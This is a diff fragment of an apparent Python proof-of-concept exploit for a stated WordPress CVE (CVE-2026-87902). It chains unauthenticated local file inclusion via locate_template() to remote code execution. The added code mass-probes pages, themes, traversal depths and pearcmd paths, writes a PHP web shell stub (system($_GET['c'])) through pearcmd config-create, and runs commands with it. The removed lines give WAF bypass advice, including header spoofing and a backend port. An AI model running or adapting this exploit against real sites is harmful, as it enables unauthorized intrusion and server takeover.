+                      port: int, verbose: bool) -> Optional[LFIResult]:
+    payload = build_payload(theme.suffix, depth, pearcmd_path)
+    url = build_url(base, page.page_id, page.slug, payload, port)
+    url_with_cmd = url + "+config-show"
+
+    try:
+        r = session.get(url_with_cmd, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
+    except Exception:
+        return None
+
+    waf, waf_type = detect_waf(r.text, dict(r.headers))
+    if waf:
+        return LFIResult(confirmed=False, page=page, theme=theme, depth=depth,
+                         pearcmd_used=pearcmd_path, lfi_url=url_with_cmd,
+                         waf_blocked=True, waf_type=waf_type)
+
+    if is_litespeed_403(r.text, r.status_code):
+        return LFIResult(confirmed=False, page=page, theme=theme, depth=depth,
+                         pearcmd_used=pearcmd_path, lfi_url=url_with_cmd,
+                         waf_blocked=True, waf_type="LiteSpeed/Imunify360")
+
+    if r.status_code not in (200, 500):
+        return None
+
+    if is_pear_response(r.text):
+        if verbose:
+            print(f"\n  [+] LFI CONFIRMED: page_id={page.page_id} theme={theme.name} "
+                  f"depth={depth} pear={pearcmd_path}")
+        return LFIResult(confirmed=True, page=page, theme=theme, depth=depth,
+                         pearcmd_used=pearcmd_path, lfi_url=url_with_cmd)
+
     return None
 
 
+def scan_lfi(session: requests.Session, base: str, pages: list[PageInfo],
+             themes: list[ThemeInfo], port: int, threads: int, verbose: bool) -> Optional[LFIResult]:
+    tasks = []
+    for page in pages:
+        for theme in themes:
+            for depth in TRAVERSAL_DEPTHS:
+                for ppath in PEARCMD_PATHS:
+                    tasks.append((page, theme, depth, ppath))
+
+    if verbose:
+        print(f"  [*] LFI combos: {len(tasks)} "
+              f"({len(pages)} pages x {len(themes)} themes x "
+              f"{len(TRAVERSAL_DEPTHS)} depths x {len(PEARCMD_PATHS)} pearcmd paths)")
+
+    waf_result: Optional[LFIResult] = None
+    confirmed_result: Optional[LFIResult] = None
+    stop_flag = [False]
+
+    def worker(args):
+        if stop_flag[0]:
+            return None
+        page, theme, depth, ppath = args
+        return _lfi_probe_single(session, base, page, theme, depth, ppath, port, verbose)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
+        futures = {ex.submit(worker, t): t for t in tasks}
+        for f in concurrent.futures.as_completed(futures):
+            if stop_flag[0] and confirmed_result:
+                break
+            r = f.result()
+            if r is None:
+                continue
+            if r.waf_blocked and not waf_result:
+                waf_result = r
+                if verbose:
+                    print(f"  [!] WAF blocked: {r.waf_type}")
+            if r.confirmed:
+                stop_flag[0] = True
+                confirmed_result = r
+
+    return confirmed_result if confirmed_result else waf_result
+
+
 # ---------------------------------------------------------------------------
-# CLI
+# Phase 6 — RCE chain
 # ---------------------------------------------------------------------------
 
-def build_arg_parser() -> argparse.ArgumentParser:
-    p = argparse.ArgumentParser(
-        prog="poc.py",
-        description="CVE-2026-87902 — WordPress LFI via locate_template()",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-examples:
-  # Auto-detect theme, verify LFI with /etc/passwd
-  python3 poc.py http://target.local
+def attempt_rce(session: requests.Session, base: str, lfi: LFIResult,
+                write_path: str, port: int, verbose: bool) -> Optional[RCEResult]:
+    if not lfi.confirmed:
+        return None
 
-  # Pin a specific page ID to avoid canonical redirects
-  python3 poc.py http://target.local --page-id 73
+    page  = lfi.page
+    theme = lfi.theme
+    depth = lfi.depth
+    ppath = lfi.pearcmd_used
 
-  # Specify theme-dir suffix and traversal depth manually
-  python3 poc.py http://target.local -t templates -d 9
+    stub_content = "<?php system($_GET['c']); ?>"
+    stub_encoded = urllib.parse.quote(stub_content)
+    stub_path = write_path
 
-  # Include a specific PHP file
-  python3 poc.py http://target.local -f /var/log/nginx/access.log
+    # Stage 1: write stub via pearcmd config-create
+    payload = build_payload(theme.suffix, depth, ppath)
+    url_stage1 = build_url(base, page.page_id, page.slug, payload, port)
+    url_stage1 += f"+config-create+{stub_encoded}+{stub_path}"
 
-  # Attempt RCE via pearcmd (requires register_argc_argv=On)
-  python3 poc.py http://target.local --rce --page-id 73
-  python3 poc.py http://target.local --rce --write-path /var/www/html/wp-content/uploads/x.php
+    if verbose:
+        print(f"  [*] RCE Stage 1: config-create -> {stub_path}")
 
-  # cPanel / CloudLinux hosting (depth 9, PHP 7.4 pearcmd path)
-  python3 poc.py http://target.local --page-id 73 -d 9 --rce
-""",
-    )
-    p.add_argument("url", help="Target WordPress base URL (e.g. http://target.local)")
-    p.add_argument(
-        "-t", "--theme-dir", metavar="SUFFIX",
-        help="Suffix of the theme's page-* dir to use (e.g. 'templates' for "
-             "'page-templates'). Auto-detected when omitted.",
-    )
-    p.add_argument(
-        "-d", "--depth", type=int, default=9, metavar="N",
-        help="Number of ../ hops from the page-* dir to the filesystem root "
-             "(default: 9, suits cPanel layout "
-             "/home/<user>/domains/<host>/public_html/wp-content/themes/<name>/).",
-    )
-    p.add_argument(
-        "--page-id", type=int, metavar="N",
-        help="WordPress page ID to include in the request (?page_id=N). "
-             "Helps avoid canonical redirects on sites with permalink rewrites. "
-             "Use any published page whose _wp_page_template is set to 'default'.",
-    )
-    p.add_argument(
-        "-f", "--file", metavar="PATH", default="/etc/passwd",
-        help="Readable file to include for LFI verification (default: /etc/passwd). "
-             "Must NOT end with .php — locate_template appends the extension.",
-    )
-    p.add_argument(
-        "--rce", action="store_true",
-        help="Attempt RCE via the pearcmd.php config-create trick "
-             "(requires register_argc_argv=On).",
-    )
-    p.add_argument(
-        "--write-path", metavar="PATH",
-        default="/tmp/cve_2026_87902.php",
-        help="Destination path for the pearcmd config stub "
-             "(default: /tmp/cve_2026_87902.php).",
-    )
-    p.add_argument(
-        "--port", type=int, metavar="N",
-        help="Override the destination TCP port (e.g. 8080 to hit Apache directly "
-             "behind LiteSpeed on cPanel servers, bypassing LiteSpeed's WAF).",
-    )
-    p.add_argument(
-        "--cookie", metavar="STR",
-        help="Cookie header value to send (e.g. 'imunify_js_cookie=abc; wp_session=xyz'). "
-             "Obtain from a real browser that has solved a WAF JS challenge.",
-    )
-    p.add_argument(
-        "-H", "--header", metavar="NAME:VALUE", action="append", dest="headers",
-        help="Extra request header (repeatable). "
-             "Example: -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: target.local'",
-    )
-    p.add_argument("-v", "--verbose", action="store_true", help="Print raw response body.")
-    return p
+    try:
+        r1 = session.get(url_stage1, timeout=DEFAULT_TIMEOUT)
+        if verbose:
+            print(f"      HTTP {r1.status_code} len={len(r1.text)}")
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Stage 1 failed: {e}")
+        return None
+
+    time.sleep(0.5)
+
+    # Stage 2: LFI the written stub and execute id
+    stub_payload = build_payload(theme.suffix, depth, stub_path)
+    url_stage2 = build_url(base, page.page_id, page.slug, stub_payload, port)
+    url_stage2 += "&c=id"
+
+    if verbose:
+        print(f"  [*] RCE Stage 2: execute -> {url_stage2}")
+
+    try:
+        r2 = session.get(url_stage2, timeout=DEFAULT_TIMEOUT)
+        if verbose:
+            print(f"      HTTP {r2.status_code} response: {r2.text[:200]}")
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Stage 2 failed: {e}")
+        return None
+
+    if is_rce_confirmed(r2.text):
+        m = re.search(r"(uid=\d+\([^)]+\)[^\n]*)", r2.text)
+        uid_out = m.group(1) if m else r2.text[:100]
+        return RCEResult(confirmed=True, shell_path=stub_path, pearcmd_used=ppath,
+                         execute_url=url_stage2, uid_output=uid_out)
+
+    return RCEResult(confirmed=False, shell_path=stub_path, pearcmd_used=ppath,
+                     execute_url=url_stage2)
 
 
-def main() -> None:
-    print(BANNER)
-    args = build_arg_parser().parse_args()
-    base_url = args.url.rstrip("/")
-    session = make_session(cookies=args.cookie, extra_headers=args.headers)
+# ---------------------------------------------------------------------------
+# Output
+# ---------------------------------------------------------------------------
 
-    # ── Step 1: resolve theme directory ────────────────────────────────────
-    suffix = args.theme_dir
-    if not suffix:
-        print("[*] Probing for vulnerable theme page-* directories …")
-        suffix = probe_theme_dirs(base_url, session)
-        if not suffix:
-            print("[-] Could not auto-detect a page-* directory.")
-            print("    Specify one manually with -t <suffix>  (e.g. -t templates)")
-            sys.exit(1)
+def print_banner():
+    print("""
+╔═══════════════════════════════════════════════════════════════╗
+║  CVE-2026-87902 — WordPress LFI via locate_template()        ║
+║  Affects: WordPress <= 7.1.1  |  Unauthenticated             ║
+╚═══════════════════════════════════════════════════════════════╝
+""")
 
-    print(f"[*] page-* directory suffix : {suffix!r}  → page-{suffix}/")
-    print(f"[*] Traversal depth         : {args.depth}")
-    if args.page_id:
-        print(f"[*] Anchor page ID          : {args.page_id}")
 
-    # ── Step 2: LFI check ──────────────────────────────────────────────────
-    lfi_target = strip_php(args.file)
-    payload = build_lfi_payload(suffix, args.depth, lfi_target)
+def print_result(result: ScanResult):
+    print("\n" + "="*65)
+    print(f"TARGET : {result.target}")
+    print(f"WP VER : {result.wp_version or 'unknown'}")
+    print(f"SERVER : {result.server_header}")
+    print(f"THEMES : {len(result.themes)}")
+    print(f"PAGES  : {len(result.pages)}")
 
-    print(f"\n[*] LFI target file  : {args.file}")
-    print(f"[*] pagename payload : {payload}")
-    if args.page_id:
-        print(f"[*] Full request URL : {base_url}/?page_id={args.page_id}&pagename={payload}")
+    if result.waf_detected:
+        print(f"\n[!] WAF DETECTED: {result.waf_type}")
+        print("    Path traversal blocked by this WAF.")
+        print("    Alternatives: symlink bypass, Apache backend port, PHP CLI.")
+
+    if result.lfi and result.lfi.confirmed:
+        lfi = result.lfi
+        print(f"\n[+] LFI CONFIRMED")
+        print(f"    Page ID : {lfi.page.page_id} ({lfi.page.slug})")
+        print(f"    Theme   : {lfi.theme.name} (suffix={lfi.theme.suffix})")
+        print(f"    Depth   : {lfi.depth}")
+        print(f"    Pear    : {lfi.pearcmd_used}")
+        print(f"    URL     : {lfi.lfi_url}")
+    elif result.lfi and result.lfi.waf_blocked:
+        print(f"\n[-] LFI blocked by WAF ({result.lfi.waf_type})")
     else:
-        print(f"[*] Full request URL : {base_url}/?pagename={payload}")
+        print("\n[-] LFI not confirmed")
 
-    resp = request_lfi(base_url, payload, session, page_id=args.page_id, port=args.port)
-    if resp is None:
-        sys.exit(1)
-
-    print(f"[*] HTTP status      : {resp.status_code}")
-
-    if args.verbose:
-        print("\n── Response body (first 1 000 chars) ──")
-        print(resp.text[:1000])
-        print("───────────────────────────────────────\n")
-
-    if detect_litespeed_block(resp.status_code, resp.text):
-        print("\n[!]  LiteSpeed WAF blocked the double-encoded payload (403).")
-        print("     LiteSpeed normalises %252F/%252e%252e before PHP sees them.")
-        print("     Bypass options (run from inside the target server):")
-        print()
-        print("     1. Apache backend on port 8080 (cPanel ships both):")
-        print(f"        python3 poc.py {base_url} --page-id {args.page_id or 'N'} -d {args.depth} --port 8080 -v")
-        print()
-        print("     2. Direct FastCGI to lsphp socket (bypasses LiteSpeed entirely):")
-        print("        # find the socket first:")
-        print("        ls /tmp/lshttpd/  # or  ls /run/lshttpd/")
-        print("        cgi-fcgi -bind -connect /tmp/lshttpd/lsphp.sock")
-        print()
-        print("     3. PHP CLI — invoke WordPress directly (no web server at all):")
-        print("        php -r \"")
-        print("          chdir('/path/to/public_html');")
-        print("          define('ABSPATH',getcwd().'/');")
-        print("          \\$_GET['pagename']='templates/../../../etc/passwd';")
-        print("          require('wp-load.php');")
-        print("          echo locate_template('templates/../../../etc/passwd');\"")
-        if not args.rce:
-            return
-    elif detect_bot_challenge(resp.text):
-        print("\n[!]  WAF / Bot-challenge detected — not a WordPress response.")
-        print("     The WAF (likely Imunify360) is intercepting requests before they")
-        print("     reach PHP. Bypass options:")
-        print()
-        print("     1. Solve the JS challenge in a real browser, then copy the cookie:")
-        print(f"        python3 poc.py {base_url} --page-id {args.page_id or 'N'} \\")
-        print( "                --cookie 'imunify_js_cookie=<value>; wordpress_logged_in=<value>'")
-        print()
-        print("     2. Run the request from the target server itself (bypasses external WAF):")
-        print(f"        curl -sk 'http://127.0.0.1/?page_id={args.page_id or 73}&pagename={payload}' \\")
-        print( "             -H 'Host: <target-domain>'")
-        print()
-        print("     3. Use direct IP with a spoofed X-Forwarded-For header:")
-        print( "        python3 poc.py <ip> --page-id N -H 'X-Forwarded-For: 127.0.0.1' \\")
-        print( "                -H 'Host: <target-domain>'")
-        if not args.rce:
-            return
-    elif resp.status_code == 200 and confirm_lfi(resp.text):
-        print("\n[!!!] LFI CONFIRMED — /etc/passwd content detected in response")
-        for line in resp.text.splitlines():
-            if ":" in line and not line.startswith("<") and len(line) < 150:
-                print(f"      {line}")
-    elif resp.status_code == 200:
-        print("[?]  HTTP 200 received but could not confirm file inclusion.")
-        print("     Try -v to inspect the response, or adjust --depth / --theme-dir.")
-    else:
-        print(f"[-]  LFI not triggered (HTTP {resp.status_code}).")
-        print("     Adjust --depth or --theme-dir and retry.")
-
-    # ── Step 3: optional RCE ───────────────────────────────────────────────
-    if not args.rce:
-        return
-
-    print("\n[*] Attempting RCE via pearcmd.php …")
-    print(f"[*] Config stub destination : {args.write_path}")
-
-    worked = attempt_pearcmd_rce(base_url, suffix, args.depth, args.write_path, session, page_id=args.page_id, port=args.port)
-    if worked:
-        print(f"\n[+] pearcmd.php triggered via : {worked}")
-        print(f"[+] PEAR config stub written  : {args.write_path}")
-        stub_payload = build_lfi_payload(suffix, args.depth, strip_php(args.write_path))
-        print(f"\n[*] Second-stage LFI to execute the stub:")
-        if args.page_id:
-            print(f"    GET {base_url}/?page_id={args.page_id}&pagename={stub_payload}")
+    if result.rce:
+        if result.rce.confirmed:
+            print(f"\n[+] RCE CONFIRMED")
+            print(f"    Shell   : {result.rce.shell_path}")
+            print(f"    UID     : {result.rce.uid_output}")
+            print(f"    Execute : {result.rce.execute_url}")
         else:
-            print(f"    GET {base_url}/?pagename={stub_payload}")
+            print(f"\n[-] RCE attempt failed")
+    print("="*65)
+
+
+def result_to_dict(result: ScanResult) -> dict:
+    def page_d(p):
+        return {"id": p.page_id, "slug": p.slug, "template": p.template, "title": p.title}
+
+    def theme_d(t):
+        return {"name": t.name, "page_dir": t.page_dir, "suffix": t.suffix, "active": t.active}
+
+    def lfi_d(l):
+        if not l:
+            return None
+        return {
+            "confirmed": l.confirmed,
+            "page": page_d(l.page) if l.page else None,
+            "theme": theme_d(l.theme) if l.theme else None,
+            "depth": l.depth,
+            "pearcmd_used": l.pearcmd_used,
+            "lfi_url": l.lfi_url,
+            "waf_blocked": l.waf_blocked,
+            "waf_type": l.waf_type,
+        }
+
+    def rce_d(r):
+        if not r:
+            return None
+        return {
+            "confirmed": r.confirmed,
+            "shell_path": r.shell_path,
+            "pearcmd_used": r.pearcmd_used,
+            "execute_url": r.execute_url,
+            "uid_output": r.uid_output,
+        }
+
+    return {
+        "target": result.target,
+        "wp_version": result.wp_version,
+        "server_header": result.server_header,
+        "waf_detected": result.waf_detected,
+        "waf_type": result.waf_type,
+        "themes": [theme_d(t) for t in result.themes],
+        "pages": [page_d(p) for p in result.pages],
+        "lfi": lfi_d(result.lfi),
+        "rce": rce_d(result.rce),
+    }
+
+
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
+
+def parse_args():
+    p = argparse.ArgumentParser(
+        description="CVE-2026-87902 WordPress LFI -> RCE PoC (fully automatic)",
+        formatter_class=argparse.RawTextHelpFormatter,
+    )
+    p.add_argument("target", help="Target base URL (e.g. https://example.com)")
+    p.add_argument("--rce", action="store_true",
+                   help="Attempt RCE via pearcmd config-create after LFI")
+    p.add_argument("--write-path", default="/tmp/wp_shell.php",
+                   help="PHP stub write path for RCE (default: /tmp/wp_shell.php)")
+    p.add_argument("--thorough", action="store_true",
+                   help="Probe all known themes + brute-force page IDs 1-200")
+    p.add_argument("--threads", type=int, default=DEFAULT_THREADS,
+                   help=f"Worker threads (default: {DEFAULT_THREADS})")
+    p.add_argument("--port", type=int, default=0,
+                   help="Override destination port (e.g. 8080 for Apache backend)")
+    p.add_argument("--cookie", default="",
+                   help="Cookie header value")
+    p.add_argument("-H", "--header", action="append", default=[], metavar="HEADER",
+                   help="Extra HTTP header (repeatable)")
+    p.add_argument("--json", action="store_true",
+                   help="Output JSON result instead of human-readable")
+    p.add_argument("-v", "--verbose", action="store_true",
+                   help="Verbose output")
+    p.add_argument("--page-id", type=int, default=0,
+                   help="Override: use this specific page_id (skips page discovery)")
+    p.add_argument("-t", "--theme", default="",
+                   help="Override: use this specific theme name (skips theme enum)")
+    p.add_argument("-d", "--depth", type=int, default=0,
+                   help="Override: use this specific traversal depth only")
+    return p.parse_args()
+
+
+def main():
+    args = parse_args()
+
+    if not args.json:
+        print_banner()
+
+    target = args.target.rstrip("/")
+    if not target.startswith(("http://", "https://")):
+        target = "http://" + target
+
+    extra_headers: dict[str, str] = {}
+    for h in args.header:
+        if ":" in h:
+            k, v = h.split(":", 1)
+            extra_headers[k.strip()] = v.strip()
+
+    session = make_session(extra_headers, args.cookie)
+    result = ScanResult(target=target)
+
+    if not args.json:
+        print(f"[*] Target  : {target}")
+        print(f"[*] Threads : {args.threads}  Thorough: {args.thorough}")
+
+    # Phase 1: WP detection
+    if not args.json:
+        print("\n[Phase 1] WordPress detection")
+    wp_ver, server_hdr = detect_wordpress(session, target, args.verbose)
+    result.wp_version = wp_ver
+    result.server_header = server_hdr
+
+    # Phase 2: Theme enumeration
+    if args.theme:
+        themes = [ThemeInfo(name=args.theme, page_dir="page-templates",
+                            suffix="templates", active=True)]
+        if not args.json:
+            print(f"\n[Phase 2] Theme override: {args.theme}")
     else:
-        print("[-] pearcmd RCE failed — all candidate paths exhausted.")
-        print("    Requirements: register_argc_argv=On  AND  pearcmd.php readable by www-data")
-        print("    Common setups: official PHP Docker image, cPanel with PHP < 8.5")
+        if not args.json:
+            print("\n[Phase 2] Theme enumeration")
+        active_theme = extract_active_theme(session, target, args.verbose)
+        themes = enumerate_themes(session, target, active_theme, args.thorough,
+                                  args.threads, args.verbose)
+        if not args.json:
+            print(f"  [*] Total themes: {len(themes)}")
+    result.themes = themes
+
+    # Phase 3 & 4: Page discovery + template filter
+    if args.page_id:
+        exploitable_pages = [PageInfo(page_id=args.page_id, slug="", template="")]
+        result.pages = exploitable_pages
+        if not args.json:
+            print(f"\n[Phase 3] Page override: page_id={args.page_id}")
+    else:
+        if not args.json:
+            print("\n[Phase 3] Page discovery")
+        pages = discover_pages(session, target, args.thorough, args.threads, args.verbose)
+        result.pages = pages
+
+        if not args.json:
+            print(f"\n[Phase 4] Template validation ({len(pages)} pages)")
+        exploitable_pages = filter_exploitable_pages(pages, args.verbose or (not args.json))
+
+    # depth override
+    if args.depth:
+        scan_depths = [args.depth]
+    else:
+        scan_depths = TRAVERSAL_DEPTHS
+
+    # temporarily replace TRAVERSAL_DEPTHS for scan
+    original_depths = TRAVERSAL_DEPTHS[:]
+    TRAVERSAL_DEPTHS.clear()
+    TRAVERSAL_DEPTHS.extend(scan_depths)
+
+    # Phase 5: LFI scan
+    if not args.json:
+        print("\n[Phase 5] LFI probe")
+    lfi_result = scan_lfi(session, target, exploitable_pages, themes,
+                          args.port, args.threads, args.verbose or (not args.json))
+    result.lfi = lfi_result
+
+    # restore
+    TRAVERSAL_DEPTHS.clear()
+    TRAVERSAL_DEPTHS.extend(original_depths)
+
+    if lfi_result and lfi_result.waf_blocked:
+        result.waf_detected = True
+        result.waf_type = lfi_result.waf_type
+
+    # Phase 6: RCE
+    if args.rce and lfi_result and lfi_result.confirmed:
+        if not args.json:
+            print("\n[Phase 6] RCE attempt")
+        rce_result = attempt_rce(session, target, lfi_result, args.write_path,
+                                 args.port, args.verbose or (not args.json))
+        result.rce = rce_result
+
+    # Output
+    if args.json:
+        print(json.dumps(result_to_dict(result), indent=2))
+    else:
+        print_result(result)
+
+    sys.exit(0 if (lfi_result and lfi_result.confirmed) else 1)
 
 
 if __name__ == "__main__":
